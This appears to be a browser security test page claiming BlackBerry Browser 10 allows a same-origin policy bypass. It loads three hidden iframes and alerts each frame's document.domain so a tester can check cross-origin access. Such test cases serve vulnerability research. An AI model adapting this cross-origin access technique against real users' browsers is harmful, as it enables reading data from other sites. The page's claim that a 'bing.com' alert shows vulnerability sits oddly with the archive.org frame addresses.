---
layout: default
title: SOP Bypass - Testcase 16
permalink: /sop/new/16
---

Attempting to trigger a SOP Bypass using Nested iframes trick (Blackberry Browser 10) is prone to it

<script>
function sop1() {
    alert(this.frames[0].document.domain);
}
function sop2() {
    alert(this.frames[1].document.domain);
}
function sop3() {
    alert(this.frames[2].document.domain);
}
</script>

<iframe width="0" height="0" src="https://web.archive.org/web/20180831134343if_/https://www.w3schools.com/" id="frame1" name="frame1" data-ruffle-polyfilled=""></iframe>
<iframe width="0" height="0" src="https://web.archive.org/web/20180831134343if_/https://www.bing.com/" id="frame2" name="frame2" data-ruffle-polyfilled=""></iframe>
<iframe width="0" height="0" src="https://web.archive.org/web/20180831134343if_/https://www.example.com/" id="frame3" name="frame3" data-ruffle-polyfilled=""></iframe>

<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="sop1()">
<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="sop2()">
<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="sop3()">

**Note:**
If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass.
